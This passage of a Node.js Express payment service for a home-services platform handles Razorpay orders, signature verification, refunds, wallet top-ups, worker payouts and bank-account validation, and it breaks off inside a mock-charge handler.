// HomeHelp Payment Service
// -------------------------
// Owns the finance domain on its own Postgres: payments, settlements, payouts, wallet_ledger,
// webhook_events. Serves the customer payment flow (/api/payment/*, /api/payments/*), the signed
// gateway + payout webhooks, and the admin finance panel. Razorpay keys / webhook secrets come
// from the admin config service. Records the customer payment on payment.succeeded and the worker
// settlement on booking.completed (both from the event bus).
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import express from 'express'
import crypto from 'node:crypto'
import {
  makePool, migrate, makeAdminAuth, requirePerm, requireAnyPerm, internalOnly, subscribeEvents, invalidateSettings,
  publishEvent, getSetting, getSettingInt, tryGet, internalPost,
} from '@homehelp/shared'
// Imported directly, not via the shared index: they carry the jsonwebtoken dep.
import { makeCustomerAuth } from '@homehelp/shared/customer-auth.js'
import { assertJwtSecret } from '@homehelp/shared/jwt.js'

assertJwtSecret('payment') // refuse to boot without a signing secret rather than trust forgeable tokens

const PORT = Number(process.env.PORT || 4008)
const DATABASE_URL = process.env.DATABASE_URL || 'postgres://homehelp:homehelp@localhost:5438/payment'
const REDIS_URL = process.env.REDIS_URL || 'redis://localhost:6379'
const ADMIN_URL = (process.env.ADMIN_URL || 'http://localhost:4010').replace(/\/$/, '')
const AUTH_URL = (process.env.AUTH_URL || 'http://localhost:4002').replace(/\/$/, '')
const BOOKING_URL = (process.env.BOOKING_URL || 'http://localhost:4006').replace(/\/$/, '')
const WORKER_URL = (process.env.WORKER_URL || 'http://localhost:4004').replace(/\/$/, '')

process.on('unhandledRejection', (e) => console.error('[payment] unhandledRejection:', e?.message || e))

const pool = makePool(DATABASE_URL)
const auth = makeCustomerAuth(AUTH_URL)
const adminAuth = makeAdminAuth(ADMIN_URL)

const PAYMENT_METHODS = [
  { group: 'UPI', recommended: true, options: [
    { id: 'phonepe', name: 'PhonePe', icon: '📲', sub: 'UPI' },
    { id: 'gpay', name: 'Google Pay', icon: '📲', sub: 'UPI' },
    { id: 'paytm', name: 'Paytm', icon: '📲', sub: 'UPI' },
    { id: 'upi', name: 'Other UPI app', icon: '📲', sub: 'BHIM, Amazon Pay & more' }] },
  { group: 'Cards', options: [{ id: 'card', name: 'Credit / Debit Card', icon: '💳', sub: 'Visa, Mastercard, RuPay' }] },
  { group: 'Net Banking', options: [{ id: 'netbanking', name: 'Net Banking', icon: '🏦', sub: 'All major banks' }] },
  { group: 'Wallets', options: [{ id: 'wallet', name: 'HomeHelp Wallet', icon: '👛', sub: 'Use your balance' }] },
  { group: 'Pay after service', options: [{ id: 'cash', name: 'Cash after service', icon: '💵', sub: 'Pay the expert directly' }] },
]

async function init() {
  await migrate(pool, [
    `CREATE TABLE IF NOT EXISTS payments (id SERIAL PRIMARY KEY, booking_id INTEGER, customer_id INTEGER, amount INTEGER, mode TEXT, gateway TEXT, payment_id TEXT, order_id TEXT, status TEXT DEFAULT 'CREATED', idempotency_key TEXT, created TIMESTAMPTZ DEFAULT now())`,
    `CREATE TABLE IF NOT EXISTS settlements (id SERIAL PRIMARY KEY, booking_id INTEGER, worker_id INTEGER, amount INTEGER, commission INTEGER, status TEXT DEFAULT 'settled', created TIMESTAMPTZ DEFAULT now())`,
    `CREATE TABLE IF NOT EXISTS payouts (id SERIAL PRIMARY KEY, worker_id INTEGER, withdrawal_id INTEGER, amount INTEGER, status TEXT DEFAULT 'processing', reference TEXT, created TIMESTAMPTZ DEFAULT now())`,
    `ALTER TABLE payouts ADD COLUMN IF NOT EXISTS mode TEXT`,
    `ALTER TABLE payouts ADD COLUMN IF NOT EXISTS failure_reason TEXT`,
    `ALTER TABLE payouts ADD COLUMN IF NOT EXISTS provider TEXT`,
    // One payout row per withdrawal — guards against double-paying if the event is redelivered.
    `CREATE UNIQUE INDEX IF NOT EXISTS ux_payout_withdrawal ON payouts(withdrawal_id) WHERE withdrawal_id IS NOT NULL`,
    `CREATE TABLE IF NOT EXISTS wallet_ledger (id SERIAL PRIMARY KEY, worker_id INTEGER, type TEXT, amount INTEGER, ref TEXT, created TIMESTAMPTZ DEFAULT now())`,
    `CREATE TABLE IF NOT EXISTS bank_validations (id SERIAL PRIMARY KEY, worker_id INTEGER, validation_id TEXT, fund_account_id TEXT, status TEXT, registered_name TEXT, created TIMESTAMPTZ DEFAULT now())`,
    `CREATE TABLE IF NOT EXISTS webhook_events (id SERIAL PRIMARY KEY, event_id TEXT UNIQUE, type TEXT, created TIMESTAMPTZ DEFAULT now())`,
    `CREATE UNIQUE INDEX IF NOT EXISTS ux_pay_booking ON payments(booking_id) WHERE booking_id IS NOT NULL`,
    // Verified-payment ledger: an order is CREATED for a customer + amount, VERIFIED once the gateway
    // signature checks out, then CLAIMED exactly once by whatever it paid for (purpose + ref).
    `ALTER TABLE payments ADD COLUMN IF NOT EXISTS purpose TEXT`,
    `ALTER TABLE payments ADD COLUMN IF NOT EXISTS claimed_ref TEXT`,
    `ALTER TABLE payments ADD COLUMN IF NOT EXISTS claimed_at TIMESTAMPTZ`,
    `ALTER TABLE payments ADD COLUMN IF NOT EXISTS refund_id TEXT`,
    `ALTER TABLE payments ADD COLUMN IF NOT EXISTS refunded_amount INTEGER DEFAULT 0`,
    `CREATE UNIQUE INDEX IF NOT EXISTS ux_pay_payment_id ON payments(payment_id) WHERE payment_id IS NOT NULL AND status IN ('VERIFIED','CLAIMED')`,
    `CREATE INDEX IF NOT EXISTS ix_pay_order ON payments(order_id)`,
    `CREATE UNIQUE INDEX IF NOT EXISTS ux_settle_booking ON settlements(booking_id)`,
    // Failed checkout attempts (status FAILED) keep why they failed, for the customer and admin.
    `ALTER TABLE payments ADD COLUMN IF NOT EXISTS failure_reason TEXT`,
    // One row per gateway refund. Razorpay accepts a refund at once but settles it later, so the
    // status moves pending → processed | failed from the refund.* webhooks.
    `CREATE TABLE IF NOT EXISTS payment_refunds (id SERIAL PRIMARY KEY, payment_id TEXT NOT NULL, refund_id TEXT UNIQUE, amount INTEGER NOT NULL, status TEXT NOT NULL DEFAULT 'pending', reason TEXT, created TIMESTAMPTZ DEFAULT now(), updated TIMESTAMPTZ DEFAULT now())`,
    `CREATE INDEX IF NOT EXISTS ix_refund_payment ON payment_refunds(payment_id)`,
  ])
  console.log('[payment] Postgres ready (payments, settlements, payouts, wallet_ledger, webhook_events)')
}

async function recordPayment(p) {
  await pool.query(
    `INSERT INTO payments (booking_id,customer_id,amount,mode,gateway,payment_id,status)
     VALUES ($1,$2,$3,$4,$5,$6,'PAID')
     ON CONFLICT (booking_id) WHERE booking_id IS NOT NULL DO UPDATE SET status='PAID', amount=EXCLUDED.amount`,
    [p.bookingId ?? null, p.customerId ?? null, p.amount ?? 0, p.mode || 'upi', p.gateway || 'razorpay', p.paymentId || null])
}

const app = express()
// Keep the raw body so webhook HMAC signatures verify over the exact bytes.
app.use(express.json({ verify: (req, _res, buf) => { req.rawBody = buf } }))
app.get('/health', (_q, res) => res.json({ service: 'payment', ok: true }))

// Fake payments exist so the flow can be tested without Razorpay keys. They are never allowed in
// production unless someone explicitly opts in (ALLOW_MOCK_PAYMENTS=true) — otherwise an app build
// pointing at a live server without keys would hand out free bookings.
const mockPaymentsAllowed = () => process.env.NODE_ENV !== 'production' || process.env.ALLOW_MOCK_PAYMENTS === 'true'

async function rzp() {
  const keyId = await getSetting(ADMIN_URL, 'razorpay_key_id', '')
  const keySecret = await getSetting(ADMIN_URL, 'razorpay_key_secret', '')
  // `payment_gateway=mock` forces demo mode (no real gateway) — used when the Razorpay keys are
  // absent/invalid so bookings can still complete in testing. Set it to 'razorpay' (or clear it)
  // once valid keys are in Admin ▸ Settings to go back to real (test-mode) Razorpay.
  const mode = (await getSetting(ADMIN_URL, 'payment_gateway', '')).trim().toLowerCase()
  const live = mode === 'mock' ? false : (mode === 'razorpay' || !!(keyId && keySecret))
  return { keyId, keySecret, live }
}

/* ---------- RazorpayX payouts (worker withdrawals -> bank) ----------
 * Config from admin settings: razorpay_key_id/secret + razorpayx_account_number (the RazorpayX
 * source account the money is debited from) + payout_mode (IMPS/NEFT/UPI). When any of those is
 * missing we run in MOCK mode: the withdrawal is completed instantly in the ledger without moving
 * real money, so dev/demo keeps working. */
async function payoutCfg() {
  const keyId = await getSetting(ADMIN_URL, 'razorpay_key_id', '')
  const keySecret = await getSetting(ADMIN_URL, 'razorpay_key_secret', '')
  const account = await getSetting(ADMIN_URL, 'razorpayx_account_number', '')
  const mode = (await getSetting(ADMIN_URL, 'payout_mode', 'IMPS')) || 'IMPS'
  return { keyId, keySecret, account, mode, live: !!(keyId && keySecret && account) }
}

// Thin RazorpayX API call with Basic auth. Throws with the API's error description on failure.
async function rzpxCall(cfg, path, body) {
  const resp = await fetch('https://api.razorpay.com' + path, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Authorization: 'Basic ' + Buffer.from(`${cfg.keyId}:${cfg.keySecret}`).toString('base64') },
    body: JSON.stringify(body),
  })
  const json = await resp.json().catch(() => ({}))
  if (!resp.ok) throw new Error(json?.error?.description || `RazorpayX ${path} failed (${resp.status})`)
  return json
}

// RazorpayX GET (Basic auth) — used to poll an async validation for its result.
async function rzpxGet(cfg, path) {
  const resp = await fetch('https://api.razorpay.com' + path, {
    headers: { Authorization: 'Basic ' + Buffer.from(`${cfg.keyId}:${cfg.keySecret}`).toString('base64') },
  })
  const json = await resp.json().catch(() => ({}))
  if (!resp.ok) throw new Error(json?.error?.description || `RazorpayX GET ${path} failed (${resp.status})`)
  return json
}

// RazorpayX payout statuses -> our ledger outcome. 'processed' = money delivered.
const PAYOUT_DONE = new Set(['processed'])
const PAYOUT_FAILED = new Set(['reversed', 'failed', 'rejected', 'cancelled'])

// RazorpayX accepts bank_account.account_type as 'savings' | 'current'. Send it only when the
// worker actually chose one — an empty/unknown value would be rejected by the API.
const bankAccountType = (bank) => {
  const t = String(bank?.bankAccountType || '').toLowerCase()
  return t === 'savings' || t === 'current' ? { account_type: t } : {}
}

// Initiate a single worker payout. Idempotent per withdrawal via the unique index; safe to re-run.
async function initiatePayout({ withdrawalId, workerId, amount, method }) {
  if (!withdrawalId || !amount || amount <= 0) return
  // Already handled? (event redelivery) — bail so we never double-pay.
  const existing = await pool.query('SELECT id, status FROM payouts WHERE withdrawal_id=$1', [withdrawalId])
  if (existing.rowCount) return

  const cfg = await payoutCfg()

  // MOCK mode — no real gateway configured. Complete instantly so the ledger reconciles.
  if (!cfg.live) {
    const reference = 'MOCK-' + withdrawalId
    await pool.query("INSERT INTO payouts (worker_id,withdrawal_id,amount,status,provider,mode,reference) VALUES ($1,$2,$3,'paid','mock',$4,$5) ON CONFLICT (withdrawal_id) WHERE withdrawal_id IS NOT NULL DO NOTHING",
      [workerId, withdrawalId, amount, method || 'bank', reference])
    publishEvent(REDIS_URL, 'payout.completed', { withdrawalId, workerId, reference })
    console.log(`[payment] payout ${withdrawalId} completed (MOCK — RazorpayX not configured)`)
    return
  }

  // LIVE — build contact -> fund account -> payout on RazorpayX.
  try {
    const worker = await tryGet(WORKER_URL, `/internal/workers/${workerId}`, null)
    const bank = (worker?.profile && worker.profile.bank) || {}
    const holder = bank.bankHolder || worker?.name || `Worker ${workerId}`
    const useUpi = String(method || '').toLowerCase() === 'upi'
    if (useUpi ? !bank.bankUpi : !(bank.bankAccount && bank.bankIfsc)) {
      throw new Error(useUpi ? 'No UPI ID on file' : 'Missing bank account / IFSC on file')
    }

    const contact = await rzpxCall(cfg, '/v1/contacts', {
      name: holder, type: 'employee', reference_id: `worker_${workerId}`,
      ...(worker?.phone ? { contact: String(worker.phone) } : {}),
    })
    // NB: the outer account_type is RazorpayX's vpa/bank_account discriminator; bank_account.account_type
    // is the worker's actual savings/current selection. Omitted entirely when not on file.
    const fundAccount = await rzpxCall(cfg, '/v1/fund_accounts', useUpi
      ? { contact_id: contact.id, account_type: 'vpa', vpa: { address: bank.bankUpi } }
      : { contact_id: contact.id, account_type: 'bank_account', bank_account: { name: holder, ifsc: bank.bankIfsc, account_number: bank.bankAccount, ...bankAccountType(bank) } })

    const payout = await rzpxCall(cfg, '/v1/payouts', {
      account_number: cfg.account,
      fund_account_id: fundAccount.id,
      amount: amount * 100, currency: 'INR',
      mode: useUpi ? 'UPI' : cfg.mode,
      purpose: 'payout', queue_if_low_balance: true,
      reference_id: `wd_${withdrawalId}`, narration: 'HomeHelp worker payout',
      notes: { withdrawalId: String(withdrawalId), workerId: String(workerId) },
    })

    const status = PAYOUT_DONE.has(payout.status) ? 'paid' : (PAYOUT_FAILED.has(payout.status) ? 'failed' : 'processing')
    await pool.query("INSERT INTO payouts (worker_id,withdrawal_id,amount,status,provider,mode,reference) VALUES ($1,$2,$3,$4,'razorpayx',$5,$6) ON CONFLICT (withdrawal_id) WHERE withdrawal_id IS NOT NULL DO NOTHING",
      [workerId, withdrawalId, amount, status, useUpi ? 'UPI' : cfg.mode, payout.id])

    // payout.utr is the bank transfer number — usually null until the rail actually settles, so the
    // webhook is where it normally arrives.
    if (status === 'paid') publishEvent(REDIS_URL, 'payout.completed', { withdrawalId, workerId, reference: payout.id, utr: payout.utr || '' })
    else if (status === 'failed') publishEvent(REDIS_URL, 'payout.failed', { withdrawalId, workerId, reason: 'Payout rejected', reference: payout.id, utr: payout.utr || '' })
    // else: queued/processing — the webhook will finalize it, but hand the ledger the gateway
    // reference now so support can trace an in-flight payout instead of waiting for the webhook.
    else publishEvent(REDIS_URL, 'payout.processing', { withdrawalId, workerId, reference: payout.id })
    console.log(`[payment] payout ${withdrawalId} -> RazorpayX ${payout.id} (${payout.status})`)
  } catch (e) {
    await pool.query("INSERT INTO payouts (worker_id,withdrawal_id,amount,status,provider,failure_reason) VALUES ($1,$2,$3,'failed','razorpayx',$4) ON CONFLICT (withdrawal_id) WHERE withdrawal_id IS NOT NULL DO NOTHING",
      [workerId, withdrawalId, amount, String(e.message || 'payout error')])
    publishEvent(REDIS_URL, 'payout.failed', { withdrawalId, workerId, reason: String(e.message || 'payout error') })
    console.error(`[payment] payout ${withdrawalId} failed:`, e.message)
  }
}

/* ---------- bank account verification (RazorpayX Fund Account Validation / penny-drop) ----------
 * When a worker saves bank details we validate the account is real and pull the bank's registered
 * holder name to catch typos / wrong accounts before any money is ever paid out. */

// Loose name match: token overlap after stripping case/punctuation. Catches an obviously wrong
// account (totally different holder) without rejecting minor spelling / initial-order differences.
// Returns true/false, or null when we can't tell (empty name from the bank).
function nameMatches(entered, registered) {
  const norm = (s) => String(s || '').toUpperCase().replace(/[^A-Z ]/g, ' ').split(/\s+/).filter((t) => t.length > 1)
  const A = norm(entered), B = new Set(norm(registered))
  if (!A.length || !B.size) return null
  const hits = A.filter((t) => B.has(t)).length
  return hits >= 1 && hits / A.length >= 0.5
}

async function initiateBankVerification({ workerId, bank, name }) {
  if (!workerId || !bank) return
  const holder = bank.bankHolder || name || `Worker ${workerId}`
  const useUpi = !(bank.bankAccount && bank.bankIfsc) && !!bank.bankUpi
  const cfg = await payoutCfg()

  // MOCK mode — no RazorpayX configured. Trust the entered details so dev/demo proceeds.
  if (!cfg.live) {
    publishEvent(REDIS_URL, 'bank.verified', { workerId, registeredName: holder, nameMatch: true, mock: true })
    console.log(`[payment] bank verify ${workerId} — MOCK auto-verified`)
    return
  }
  if (useUpi ? !bank.bankUpi : !(bank.bankAccount && bank.bankIfsc)) {
    return publishEvent(REDIS_URL, 'bank.verify.failed', { workerId, reason: 'Missing bank / UPI details' })
  }
  try {
    const contact = await rzpxCall(cfg, '/v1/contacts', { name: holder, type: 'employee', reference_id: `worker_${workerId}` })
    const fa = await rzpxCall(cfg, '/v1/fund_accounts', useUpi
      ? { contact_id: contact.id, account_type: 'vpa', vpa: { address: bank.bankUpi } }
      : { contact_id: contact.id, account_type: 'bank_account', bank_account: { name: holder, ifsc: bank.bankIfsc, account_number: bank.bankAccount, ...bankAccountType(bank) } })
    const val = await rzpxCall(cfg, '/v1/fund_accounts/validations', {
      account_number: cfg.account, fund_account: { id: fa.id }, amount: 100, currency: 'INR',
      notes: { workerId: String(workerId), holder },
    })
    await pool.query('INSERT INTO bank_validations (worker_id,validation_id,fund_account_id,status) VALUES ($1,$2,$3,$4)', [workerId, val.id, fa.id, val.status || 'created'])
    // The penny-drop is ASYNC — the create response usually has no result yet (status "created").
    // Poll a few times for the outcome; the fund_account.validation webhook is the backstop.
    let res = val
    for (let i = 0; i < 5 && !res.results?.account_status; i++) {
      await new Promise((r) => setTimeout(r, 3000))
      res = await rzpxGet(cfg, `/v1/fund_accounts/validations/${val.id}`).catch(() => res)
    }
    if (res.results?.account_status) await finalizeBankValidation(res, holder)
    else console.log(`[payment] bank verify ${workerId} — validation ${val.id} still '${res.status}', awaiting webhook`)
  } catch (e) {
    publishEvent(REDIS_URL, 'bank.verify.failed', { workerId, reason: String(e.message || 'validation error') })
    console.error(`[payment] bank verify ${workerId} failed:`, e.message)
  }
}

// Map a completed RazorpayX validation to Verified/Rejected + emit the event the worker service consumes.
async function finalizeBankValidation(entity, holderHint) {
  const fromDb = (await pool.query('SELECT worker_id FROM bank_validations WHERE validation_id=$1', [entity.id])).rows[0]
  const workerId = Number(entity.notes?.workerId) || fromDb?.worker_id
  if (!workerId) return
  const holder = entity.notes?.holder || holderHint || ''
  const accStatus = entity.results?.account_status || (entity.status === 'completed' ? 'active' : '')
  const registered = entity.results?.registered_name || ''
  await pool.query('UPDATE bank_validations SET status=$1, registered_name=$2 WHERE validation_id=$3', [accStatus || entity.status || 'completed', registered, entity.id])
  if (accStatus === 'active') {
    publishEvent(REDIS_URL, 'bank.verified', { workerId, registeredName: registered, nameMatch: nameMatches(holder, registered) })
    console.log(`[payment] bank verify ${workerId} -> verified (${registered || 'no name'})`)
  } else {
    publishEvent(REDIS_URL, 'bank.verify.failed', { workerId, reason: accStatus ? `Account ${accStatus}` : 'Validation failed', registeredName: registered })
    console.log(`[payment] bank verify ${workerId} -> rejected (${accStatus || 'failed'})`)
  }
}

/* ---------- customer payment flow ---------- */
app.get('/api/payment/methods', (_q, res) => res.json({ methods: PAYMENT_METHODS }))
app.get('/api/payment/config', async (_q, res) => {
  const r = await rzp()
  res.json({
    provider: r.live ? 'razorpay' : 'mock', keyId: r.live ? r.keyId : null,
    upiVpa: await getSetting(ADMIN_URL, 'upi_vpa', 'homehelp@upi'),
    payeeName: await getSetting(ADMIN_URL, 'upi_payee_name', 'HomeHelp Services'),
    upiMode: await getSetting(ADMIN_URL, 'upi_mode', 'demo'),
  })
})
const newOrderRow = (customerId, amount, orderId, gateway, purpose) => pool.query(
  "INSERT INTO payments (customer_id,amount,mode,gateway,order_id,status,purpose) VALUES ($1,$2,'online',$3,$4,'CREATED',$5)",
  [customerId, amount, gateway, orderId, purpose || null])
app.post('/api/payment/order', auth, async (req, res) => {
  const amount = Math.max(0, Math.round(Number(req.body?.amount) || 0))
  if (amount <= 0) return res.status(400).json({ error: 'Invalid amount' })
  const purpose = req.body?.purpose ? String(req.body.purpose).slice(0, 40) : null
  const r = await rzp()
  if (r.live) {
    try {
      const resp = await fetch('https://api.razorpay.com/v1/orders', {
        method: 'POST', headers: { 'Content-Type': 'application/json', Authorization: 'Basic ' + Buffer.from(`${r.keyId}:${r.keySecret}`).toString('base64') },
        body: JSON.stringify({ amount: amount * 100, currency: 'INR', receipt: 'rcpt_' + Date.now() }),
      })
      const o = await resp.json()
      if (!resp.ok) return res.status(502).json({ error: o?.error?.description || 'Gateway order failed' })
      await newOrderRow(req.user.id, amount, o.id, 'razorpay', purpose)
      return res.json({ provider: 'razorpay', orderId: o.id, amount, currency: 'INR', keyId: r.keyId })
    } catch { return res.status(502).json({ error: 'Could not reach payment gateway' }) }
  }
  if (!mockPaymentsAllowed()) return res.status(503).json({ error: 'Online payments are not set up yet.' })
  const orderId = 'order_mock_' + crypto.randomBytes(6).toString('hex')
  await newOrderRow(req.user.id, amount, orderId, 'mock', purpose)
  res.json({ provider: 'mock', orderId, amount, currency: 'INR' })
})
// Mark the customer's own order as paid-and-verified. Returns the payment id to hand to whatever
// the money is for; that id can then be claimed exactly once, for at most the order's amount.
// A FAILED order can still be paid: Razorpay lets the customer retry the same order after a failed attempt.
async function markVerified(customerId, orderId, paymentId) {
  const { rows } = await pool.query(
    `UPDATE payments SET payment_id=$3, status='VERIFIED', failure_reason=NULL WHERE order_id=$1 AND customer_id=$2 AND status IN ('CREATED','FAILED') RETURNING *`,
    [orderId, customerId, paymentId])
  return rows[0] || null
}
// Record a failed/abandoned checkout attempt. Only an unpaid order can fail — a verified or claimed
// payment is never downgraded by a late failure report.
async function markFailed(orderId, reason, { customerId, paymentId } = {}) {
  const { rows } = await pool.query(
    // Once failed, a later report without a gateway payment id (e.g. the customer closing the
    // checkout after the failure) keeps the gateway's more specific reason.
    `UPDATE payments SET status='FAILED', payment_id=COALESCE($4, payment_id),
       failure_reason=CASE WHEN status='FAILED' AND failure_reason IS NOT NULL AND $4::text IS NULL THEN failure_reason ELSE $2 END
      WHERE order_id=$1 AND status IN ('CREATED','FAILED') AND ($3::int IS NULL OR customer_id=$3) RETURNING *`,
    [String(orderId), String(reason || 'Payment failed').slice(0, 200), customerId ?? null, paymentId || null])
  return rows[0] || null
}
// The app reports a checkout that failed or was closed, so the attempt shows up as failed rather
// than sitting at CREATED forever.
app.post('/api/payment/failed', auth, async (req, res) => {
  const orderId = String(req.body?.orderId || '')
  if (!orderId) return res.status(400).json({ error: 'Missing orderId' })
  const row = await markFailed(orderId, req.body?.reason, { customerId: req.user.id, paymentId: req.body?.paymentId ? String(req.body.paymentId) : null })
  res.json({ ok: !!row })
})
// The customer's own online payments, newest first, with any refunds against each — the
// "transaction details" the app shows. Orders never paid or reported are left out.
app.get('/api/payment/transactions', auth, async (req, res) => {
  const { rows } = await pool.query(
    `SELECT id, order_id, payment_id, amount, gateway, status, purpose, claimed_ref, failure_reason, refunded_amount, created
       FROM payments WHERE customer_id=$1 AND status IN ('VERIFIED','CLAIMED','FAILED') ORDER BY id DESC LIMIT 200`, [req.user.id])
  const ids = rows.map((r) => r.payment_id).filter(Boolean)
  const refunds = ids.length ? (await pool.query(
    'SELECT payment_id, refund_id, amount, status, created, updated FROM payment_refunds WHERE payment_id = ANY($1) ORDER BY id', [ids])).rows : []
  res.json(rows.map((r) => ({
    id: r.id, orderId: r.order_id, paymentId: r.payment_id, amount: r.amount, gateway: r.gateway,
    status: r.status === 'FAILED' ? 'failed' : 'paid', purpose: r.purpose || null,
    bookingId: Number(/^booking:(\d+)$/.exec(r.claimed_ref || '')?.[1]) || null,
    failureReason: r.failure_reason || null, refunded: r.refunded_amount || 0, created: r.created,
    refunds: refunds.filter((f) => f.payment_id === r.payment_id).map((f) => ({ id: f.refund_id, amount: f.amount, status: f.status, created: f.created, updated: f.updated })),
  })))
})
app.post('/api/payment/verify', auth, async (req, res) => {
  const { razorpay_order_id, razorpay_payment_id, razorpay_signature } = req.body || {}
  const r = await rzp()
  if (!r.live) return res.status(400).json({ error: 'Razorpay not configured' })
  if (!razorpay_order_id || !razorpay_payment_id || !razorpay_signature) return res.status(400).json({ error: 'Missing payment fields' })
  const expected = crypto.createHmac('sha256', r.keySecret).update(`${razorpay_order_id}|${razorpay_payment_id}`).digest('hex')
  const a = Buffer.from(expected), b = Buffer.from(String(razorpay_signature))
  if (a.length !== b.length || !crypto.timingSafeEqual(a, b)) return res.status(400).json({ error: 'Payment verification failed' })
  const row = await markVerified(req.user.id, String(razorpay_order_id), String(razorpay_payment_id))
  if (!row) {
    // Re-verifying the same payment (a retried call) is fine; anything else is not this customer's order.
    const again = (await pool.query("SELECT 1 FROM payments WHERE order_id=$1 AND customer_id=$2 AND payment_id=$3", [razorpay_order_id, req.user.id, razorpay_payment_id])).rowCount
    if (!again) return res.status(400).json({ error: 'Unknown order' })
  }
  res.json({ ok: true, txnId: razorpay_payment_id })
})

/* Claim a verified payment for what it paid for. Single use, same customer, and it must cover the
 * amount — a ₹1 payment can't be passed off as a ₹500 booking, and one payment can't pay twice. */
async function claimPayment({ paymentId, customerId, amount, purpose, ref }) {
  const { rows } = await pool.query(
    `UPDATE payments SET status='CLAIMED', purpose=COALESCE($4, purpose), claimed_ref=$5, claimed_at=now()
      WHERE payment_id=$1 AND customer_id=$2 AND status='VERIFIED' AND amount >= $3 RETURNING *`,
    [String(paymentId || ''), Number(customerId), Math.round(Number(amount) || 0), purpose || null, ref != null ? String(ref) : null])
  return rows[0] || null
}
app.post('/api/internal/payment/claim', internalOnly, async (req, res) => {
  const row = await claimPayment(req.body || {})
  if (!row) return res.status(402).json({ error: 'Payment not received. Please pay again.' })
  res.json({ ok: true, paymentId: row.payment_id, amount: row.amount, gateway: row.gateway })
})
// Point an already-claimed payment at the record it paid for (e.g. the booking id once it exists).
app.post('/api/internal/payment/attach', internalOnly, async (req, res) => {
  await pool.query('UPDATE payments SET claimed_ref=$2 WHERE payment_id=$1 AND status=$3', [String(req.body?.paymentId || ''), String(req.body?.ref || ''), 'CLAIMED'])
  res.json({ ok: true })
})
/* Refund (part of) a claimed payment back to where it came from. Razorpay when live; recorded only
 * for mock payments. Never refunds more than was paid minus what has already gone back. */
app.post('/api/internal/payment/refund', internalOnly, async (req, res) => {
  const paymentId = String(req.body?.paymentId || '')
  const row = (await pool.query("SELECT * FROM payments WHERE payment_id=$1 AND status='CLAIMED'", [paymentId])).rows[0]
  if (!row) return res.status(404).json({ error: 'No such payment' })
  const left = row.amount - (row.refunded_amount || 0)
  const amount = Math.min(left, Math.max(0, Math.round(Number(req.body?.amount) || 0)))
  if (amount <= 0) return res.json({ ok: true, amount: 0 })
  let refundId
  if (row.gateway === 'razorpay') {
    const r = await rzp()
    if (!r.live) return res.status(503).json({ error: 'Payment gateway not configured' })
    try {
      const resp = await fetch(`https://api.razorpay.com/v1/payments/${encodeURIComponent(paymentId)}/refund`, {
        method: 'POST', headers: { 'Content-Type': 'application/json', Authorization: 'Basic ' + Buffer.from(`${r.keyId}:${r.keySecret}`).toString('base64') },
        body: JSON.stringify({ amount: amount * 100, notes: { reason: String(req.body?.reason || '').slice(0, 200) } }),
      })
      const j = await resp.json().catch(() => ({}))
      if (!resp.ok) return res.status(502).json({ error: j?.error?.description || 'Refund failed at the gateway' })
      refundId = j.id
    } catch { return res.status(502).json({ error: 'Could not reach payment gateway' }) }
  } else refundId = 'rfnd_mock_' + crypto.randomBytes(5).toString('hex')
  await pool.query('UPDATE payments SET refunded_amount=COALESCE(refunded_amount,0)+$2, refund_id=$3 WHERE id=$1', [row.id, amount, refundId])
  // A mock refund has nothing to settle; a gateway refund is pending until refund.processed arrives.
  await pool.query('INSERT INTO payment_refunds (payment_id, refund_id, amount, status, reason) VALUES ($1,$2,$3,$4,$5) ON CONFLICT (refund_id) DO NOTHING',
    [paymentId, refundId, amount, row.gateway === 'razorpay' ? 'pending' : 'processed', String(req.body?.reason || '').slice(0, 200) || null])
  res.json({ ok: true, amount, refundId })
})
// Verified wallet top-up. Credits the customer wallet ONLY after the gateway payment passed
// server-side signature verification (done in /api/payment/verify). Idempotent by payment_id, so
// a repeated call or a duplicate Razorpay webhook can never double-credit the wallet.
app.post('/api/payment/wallet/topup', auth, async (req, res) => {
  const amount = Math.max(1, Math.round(Number(req.body?.amount) || 0))
  const paymentId = String(req.body?.paymentId || '').trim()
  if (!amount || !paymentId) return res.status(400).json({ error: 'Missing amount or paymentId' })
  // The payment must be this customer's, verified, unclaimed and cover the amount. Claiming it is
  // the idempotency guard too — one gateway payment credits the wallet exactly once.
  const dup = await pool.query("SELECT 1 FROM payments WHERE payment_id=$1 AND customer_id=$2 AND purpose='wallet_topup' AND status='CLAIMED'", [paymentId, req.user.id])
  if (dup.rowCount) return res.json({ ok: true, duplicate: true })
  if (!(await claimPayment({ paymentId, customerId: req.user.id, amount, purpose: 'wallet_topup', ref: 'wallet' }))) return res.status(400).json({ error: 'Payment not verified' })
  let balance = null
  try {
    const credited = await internalPost(AUTH_URL, `/api/internal/users/${req.user.id}/wallet`, { type: 'credit', kind: 'ADD_MONEY', title: 'Added to wallet', amount, ref: paymentId })
    balance = credited?.balance ?? null
  } catch { return res.status(502).json({ error: 'Could not credit wallet' }) }
  res.json({ ok: true, balance })
})

// Settle a service extension paid via the gateway. Called INTERNALLY by the booking service from
// its approve handler — the customer completed a Razorpay checkout mid-service and the booking must
// only grant the extra time once the money is recorded here. Booking_id is deliberately NULL (the
// payments table has a unique index on booking_id — the original booking already owns that row), so
// the booking reference rides in order_id. Idempotent by payment_id so a retried approve or a
// duplicate webhook can never double-charge. Status 'PAID' → counts as revenue in the admin panel.
app.post('/api/internal/payment/extension', internalOnly, async (req, res) => {
  const bookingId = Number(req.body?.bookingId) || null
  const extId = Number(req.body?.extId) || null
  const customerId = Number(req.body?.customerId) || null
  const amount = Math.max(1, Math.round(Number(req.body?.amount) || 0))
  const paymentId = String(req.body?.paymentId || '').trim()
  if (!amount || !paymentId) return res.status(400).json({ error: 'Missing amount or paymentId' })
  const orderRef = `EXT-BK${bookingId || '?'}${extId ? '-' + extId : ''}`
  // Idempotency — one gateway payment settles exactly one extension; a retried approve is fine.
  const dup = await pool.query("SELECT 1 FROM payments WHERE payment_id=$1 AND status='CLAIMED' AND claimed_ref=$2", [paymentId, orderRef])
  if (dup.rowCount) return res.json({ ok: true, duplicate: true })
  // Never trust a frontend "success": the payment must be verified, this customer's and cover it.
  if (!(await claimPayment({ paymentId, customerId, amount, purpose: 'extension', ref: orderRef }))) return res.status(400).json({ error: 'Payment not verified' })
  res.json({ ok: true })
})

// Test-mode "payment": completes one of the customer's own mock orders. Refused when Razorpay is
// live, and in production unless mock payments were explicitly allowed.
app.post('/api/payment/charge', auth, async (req, res) => {
  const r = await rzp()
  if (r.live) return res.status(400).json({ error: 'Use the Razorpay checkout flow' })
